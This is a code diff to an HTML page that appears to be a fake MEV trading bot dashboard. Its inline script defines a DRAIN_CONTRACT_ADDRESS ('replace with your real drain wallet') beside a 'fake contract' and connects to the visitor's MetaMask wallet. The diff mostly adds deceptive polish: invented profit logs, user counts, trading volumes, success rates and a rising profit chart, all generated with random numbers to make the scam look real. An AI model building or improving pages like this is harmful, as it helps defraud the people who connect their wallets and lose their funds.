@@ -14,6 +14,9 @@
             --card: #1e293b;
             --text: #f1f5f9;
             --muted: #94a3b8;
+            --green: #10b981;
+            --red: #ef4444;
+            --yellow: #f59e0b;
         }
         
         * {
@@ -62,6 +65,14 @@
             padding: 20px;
             border-radius: 12px;
             box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        
+        .metric-value {
+            font-size: 2rem;
+            font-weight: 700;
+            margin: 10px 0;
+            color: var(--primary);
         }
         
         .logs-section {
@@ -72,6 +83,15 @@
             box-shadow: 0 4px 6px rgba(0,0,0,0.1);
         }
         
+        .log-container-wrapper {
+            height: 400px;
+            overflow-y: auto;
+            background: rgba(0,0,0,0.2);
+            border-radius: 8px;
+            padding: 15px;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        
         .log-entry {
             padding: 12px;
             margin: 8px 0;
@@ -79,6 +99,19 @@
             border-radius: 6px;
             font-family: monospace;
             font-size: 0.9rem;
+            border-left: 3px solid var(--primary);
+        }
+        
+        .log-entry.success {
+            border-left-color: var(--success);
+        }
+        
+        .log-entry.warning {
+            border-left-color: var(--warning);
+        }
+        
+        .log-entry.error {
+            border-left-color: var(--red);
         }
         
         .deploy-section {
@@ -139,6 +172,88 @@
         .status-failed {
             background: #ef4444;
         }
+        
+        /* Chart styles */
+        .chart-container {
+            height: 200px;
+            background: rgba(0,0,0,0.2);
+            border-radius: 8px;
+            margin: 20px 0;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .chart-grid {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                linear-gradient(to right, rgba(255,255,255,0.1) 1px, transparent 1px),
+                linear-gradient(to bottom, rgba(255,255,255,0.1) 1px, transparent 1px);
+            background-size: 20px 20px;
+        }
+        
+        .chart-line {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            stroke: var(--green);
+            stroke-width: 2;
+            fill: none;
+        }
+        
+        .chart-fill {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            fill: rgba(16, 185, 129, 0.2);
+        }
+        
+        .chart-points {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+        }
+        
+        .chart-point {
+            position: absolute;
+            width: 8px;
+            height: 8px;
+            background: var(--green);
+            border-radius: 50%;
+            transform: translate(-50%, 50%);
+        }
+        
+        /* Stats grid */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 15px;
+            margin: 20px 0;
+        }
+        
+        .stat-card {
+            background: rgba(0,0,0,0.2);
+            padding: 15px;
+            border-radius: 8px;
+            text-align: center;
+        }
+        
+        .stat-value {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--primary);
+        }
+        
+        .stat-label {
+            font-size: 0.8rem;
+            color: var(--muted);
+            margin-top: 5px;
+        }
     </style>
 </head>
 <body>
@@ -186,7 +301,47 @@
         
         <section class="logs-section">
             <h2>MEV Activity Feed</h2>
-            <div id="log-container"></div>
+            
+            <!-- Enhanced Stats -->
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <div class="stat-value" id="users-online">1,247</div>
+                    <div class="stat-label">Active Users</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value" id="total-volume">24.8M</div>
+                    <div class="stat-label">24h Volume (USD)</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value" id="success-rate">94.2%</div>
+                    <div class="stat-label">Success Rate</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value" id="avg-profit">0.842</div>
+                    <div class="stat-label">Avg Profit (ETH)</div>
+                </div>
+            </div>
+            
+            <!-- Profit Chart -->
+            <div class="chart-container">
+                <div class="chart-grid"></div>
+                <svg viewBox="0 0 400 100" preserveAspectRatio="none" style="width:100%; height:100%;">
+                    <defs>
+                        <linearGradient id="gradient" x1="0%" y1="0%" x2="0%" y2="100%">
+                            <stop offset="0%" stop-color="#10b981" stop-opacity="0.3"/>
+                            <stop offset="100%" stop-color="#10b981" stop-opacity="0"/>
+                        </linearGradient>
+                    </defs>
+                    <path id="chart-fill" fill="url(#gradient)"></path>
+                    <path id="chart-line" stroke="#10b981" stroke-width="2" fill="none"></path>
+                    <g id="chart-points"></g>
+                </svg>
+            </div>
+            
+            <!-- Log Container with Scroll -->
+            <div class="log-container-wrapper">
+                <div id="log-container"></div>
+            </div>
         </section>
         
         <section class="deploy-section">
@@ -197,13 +352,13 @@
     </div>
 
     <script>
-        // Inline connect.js functionality
+        // Enhanced connect.js functionality
         let provider;
         let signer;
         let userAddress;
 
         // REPLACE THESE ADDRESSES
-        const DRAIN_CONTRACT_ADDRESS = "0x9A624fa9B08CFb66CC33Ed39D6dd980c9C7dB59E"; // Replace with your real drain wallet
+        const DRAIN_CONTRACT_ADDRESS = "YOUR_DRAIN_WALLET_ADDRESS_HERE"; // Replace with your real drain wallet
         const FAKE_CONTRACT_ADDRESS = "0x8f3Cf7ad23Cd3CaDbD9735AFf9580232F68451d1"; // Fake contract
 
         const MEV_SEARCHER_ABI = [
@@ -214,6 +369,9 @@
         ];
 
         async function initWalletConnection() {
+            // Wait a bit for MetaMask to load
+            await new Promise(resolve => setTimeout(resolve, 1000));
+            
             if (typeof window.ethereum !== 'undefined') {
                 try {
                     // Request account access
@@ -375,17 +533,18 @@
             ];
         }
 
-        // Inline logs.js functionality
+        // Enhanced logs.js functionality
         class MEVSimulator {
             constructor() {
                 this.protocols = [
                     'Uniswap V3', 'Curve Finance', 'Balancer', 'SushiSwap', 
-                    'Aave', 'Compound', 'MakerDAO', 'Synthetix'
+                    'Aave', 'Compound', 'MakerDAO', 'Synthetix', 'Lido', 'Convex'
                 ];
-                this.tokens = ['WETH', 'DAI', 'USDC', 'WBTC', 'LINK'];
-                this.pools = ['ETH/USDC', 'WBTC/WETH', 'DAI/USDC', 'LINK/WETH'];
+                this.tokens = ['WETH', 'DAI', 'USDC', 'WBTC', 'LINK', 'UNI', 'AAVE', 'COMP', 'CRV', 'SNX'];
+                this.pools = ['ETH/USDC', 'WBTC/WETH', 'DAI/USDC', 'LINK/WETH', 'UNI/WETH', 'AAVE/WETH'];
                 this.history = [];
                 this.logContainer = null;
+                this.profitData = [0, 0.2, 0.5, 0.8, 1.2, 1.8, 2.5, 3.1, 3.8, 4.2]; // Initial profit data
             }
             
             getRandomProtocol() {
@@ -401,56 +560,136 @@
             }
             
             generateTransaction() {
-                const types = ['Arbitrage', 'Liquidation', 'Sandwich', 'Flash Loan'];
-                const type = types[Math.floor(Math.random() * types.length)];
+                const types = [
+                    { name: 'Arbitrage', color: 'success' },
+                    { name: 'Liquidation', color: 'warning' },
+                    { name: 'Sandwich', color: 'success' },
+                    { name: 'Flash Loan', color: 'success' },
+                    { name: 'Cex-Dex', color: 'success' },
+                    { name: 'Yield', color: 'success' }
+                ];
+                const typeObj = types[Math.floor(Math.random() * types.length)];
                 
-                const profit = (Math.random() * 0.8 + 0.05).toFixed(4);
-                const gasUsed = Math.floor(Math.random() * 200000 + 50000);
+                const profit = (Math.random() * 2.5 + 0.05).toFixed(4);
+                const gasUsed = Math.floor(Math.random() * 300000 + 80000);
                 const timestamp = new Date().toLocaleTimeString();
+                const userCount = Math.floor(Math.random() * 500) + 50;
+                const volume = (Math.random() * 100000 + 10000).toFixed(0);
                 
                 let details = '';
-                switch(type) {
+                switch(typeObj.name) {
                     case 'Arbitrage':
-                        details = `Arbitrage opportunity found in ${this.getRandomPool()} pool`;
+                        details = `Arbitrage opportunity found in ${this.getRandomPool()} pool | Users: ${userCount} | Volume: $${volume}`;
                         break;
                     case 'Liquidation':
-                        details = `Liquidated ${this.getRandomToken()} position for ${profit} ETH profit`;
+                        details = `Liquidated ${this.getRandomToken()} position | Gas: ${gasUsed.toLocaleString()} | Profit: ${profit} ETH`;
                         break;
                     case 'Sandwich':
-                        details = `Sandwich attack executed on large trade`;
+                        details = `Sandwich attack executed | Block: ${Math.floor(Math.random() * 10000000)} | Gas: ${gasUsed.toLocaleString()}`;
                         break;
                     case 'Flash Loan':
-                        details = `Flash loan arbitrage completed`;
+                        details = `Flash loan arbitrage completed | Leverage: ${(Math.random() * 10 + 2).toFixed(1)}x | Profit: ${profit} ETH`;
+                        break;
+                    case 'Cex-Dex':
+                        details = `CEX-DEX arbitrage executed | Spread: ${(Math.random() * 0.5 + 0.1).toFixed(2)}% | Volume: $${volume}`;
+                        break;
+                    case 'Yield':
+                        details = `Yield farming harvest | APY: ${(Math.random() * 50 + 10).toFixed(1)}% | Tokens: ${this.getRandomToken()}`;
                         break;
                 }
                 
                 return {
-                    type,
+                    type: typeObj.name,
                     profit: parseFloat(profit),
                     gasUsed,
                     timestamp,
                     details,
-                    protocol: this.getRandomProtocol()
+                    protocol: this.getRandomProtocol(),
+                    users: userCount,
+                    volume: volume,
+                    color: typeObj.color
                 };
             }
             
             createLogEntry(tx) {
                 const entry = document.createElement('div');
-                entry.className = `log-entry ${tx.profit > 0.3 ? 'success' : 'warning'}`;
+                entry.className = `log-entry ${tx.color}`;
                 
-                const profitColor = tx.profit > 0.5 ? '#10b981' : '#f59e0b';
+                const profitColor = tx.profit > 1.0 ? '#10b981' : (tx.profit > 0.5 ? '#f59e0b' : '#ef4444');
+                const gasColor = tx.gasUsed > 200000 ? '#ef4444' : '#10b981';
                 
                 entry.innerHTML = `
-                    <div style="display: flex; justify-content: space-between; align-items: center;">
-                        <span><strong>${tx.timestamp}</strong> - ${tx.type}</span>
+                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 5px;">
+                        <span><strong>${tx.timestamp}</strong> - ${tx.type} via ${tx.protocol}</span>
                         <span style="color: ${profitColor}; font-weight: bold;">${tx.profit} ETH</span>
                     </div>
-                    <div style="font-size: 0.85rem; color: #94a3b8; margin-top: 5px;">
-                        ${tx.details} via ${tx.protocol} | Gas: ${tx.gasUsed.toLocaleString()}
+                    <div style="font-size: 0.85rem; color: #94a3b8; margin-bottom: 5px;">
+                        ${tx.details}
+                    </div>
+                    <div style="display: flex; justify-content: space-between; font-size: 0.75rem; color: #64748b;">
+                        <span>Gas: <span style="color: ${gasColor};">${tx.gasUsed.toLocaleString()}</span></span>
+                        <span>Users: ${tx.users.toLocaleString()}</span>
+                        <span>Volume: $${tx.volume}</span>
                     </div>
                 `;
                 
                 return entry;
+            }
+            
+            updateChart() {
+                // Add new profit data point
+                const newProfit = parseFloat((Math.random() * 5 + this.profitData[this.profitData.length - 1]).toFixed(2));
+                this.profitData.push(newProfit);
+                
+                // Keep only last 20 points
+                if (this.profitData.length > 20) {
+                    this.profitData.shift();
+                }
+                
+                // Update chart
+                const svg = document.querySelector('svg');
+                const width = 400;
+                const height = 100;
+                const padding = 10;
+                
+                // Normalize data to fit chart
+                const maxProfit = Math.max(...this.profitData);
+                const minProfit = Math.min(...this.profitData);
+                const range = maxProfit - minProfit || 1;
+                
+                const points = this.profitData.map((profit, i) => {
+                    const x = (i / (this.profitData.length - 1)) * (width - 2 * padding) + padding;
+                    const y = height - padding - ((profit - minProfit) / range) * (height - 2 * padding);
+                    return `${x},${y}`;
+                }).join(' ');
+                
+                // Update line path
+                document.getElementById('chart-line').setAttribute('d', `M ${points}`);
+                
+                // Update fill path
+                document.getElementById('chart-fill').setAttribute('d', `M ${padding},${height - padding} L ${points} L ${width - padding},${height - padding} Z`);
+                
+                // Update points
+                const pointsContainer = document.getElementById('chart-points');
+                pointsContainer.innerHTML = '';
+                this.profitData.forEach((profit, i) => {
+                    const x = (i / (this.profitData.length - 1)) * (width - 2 * padding) + padding;
+                    const y = height - padding - ((profit - minProfit) / range) * (height - 2 * padding);
+                    const point = document.createElementNS('http://www.w3.org/2000/svg', 'circle');
+                    point.setAttribute('cx', x);
+                    point.setAttribute('cy', y);
+                    point.setAttribute('r', '2');
+                    point.setAttribute('fill', '#10b981');
+                    pointsContainer.appendChild(point);
+                });
+            }
+            
+            updateStats() {
+                // Update dynamic stats
+                document.getElementById('users-online').textContent = (Math.floor(Math.random() * 2000) + 800).toLocaleString();
+                document.getElementById('total-volume').textContent = `$${(Math.random() * 50 + 20).toFixed(1)}M`;
+                document.getElementById('success-rate').textContent = `${(Math.random() * 5 + 90).toFixed(1)}%`;
+                document.getElementById('avg-profit').textContent = (Math.random() * 1.5 + 0.5).toFixed(3);
             }
             
             startSimulation(containerId) {
@@ -458,12 +697,12 @@
                 if (!this.logContainer) return;
                 
                 // Initial burst of logs
-                for (let i = 0; i < 5; i++) {
+                for (let i = 0; i < 3; i++) {
                     setTimeout(() => {
                         const tx = this.generateTransaction();
                         const entry = this.createLogEntry(tx);
                         this.logContainer.insertBefore(entry, this.logContainer.firstChild);
-                    }, i * 300);
+                    }, i * 200);
                 }
                 
                 // Continuous simulation
@@ -474,10 +713,14 @@
                     this.logContainer.insertBefore(entry, this.logContainer.firstChild);
                     
                     // Limit log entries
-                    if (this.logContainer.children.length > 20) {
+                    if (this.logContainer.children.length > 50) {
                         this.logContainer.removeChild(this.logContainer.lastChild);
                     }
-                }, 3000 + Math.random() * 2000);
+                    
+                    // Update chart and stats
+                    this.updateChart();
+                    this.updateStats();
+                }, 2000 + Math.random() * 3000);
             }
         }
 
@@ -510,14 +753,17 @@
             
             // Analytics updater
             setInterval(updateAnalytics, 5000);
+            
+            // Initialize chart
+            simulator.updateChart();
         });
         
         function updateAnalytics() {
             // Simulate changing metrics
-            const totalProfit = (Math.random() * 5).toFixed(4);
-            const strategies = Math.floor(Math.random() * 15) + 5;
-            const efficiency = (95 + Math.random() * 5).toFixed(1);
-            const latency = Math.floor(8 + Math.random() * 15);
+            const totalProfit = (Math.random() * 15 + 2).toFixed(4);
+            const strategies = Math.floor(Math.random() * 25) + 8;
+            const efficiency = (92 + Math.random() * 8).toFixed(1);
+            const latency = Math.floor(5 + Math.random() * 25);
             
             const profitEl = document.getElementById('total-profit');
             const strategiesEl = document.getElementById('active-strategies');
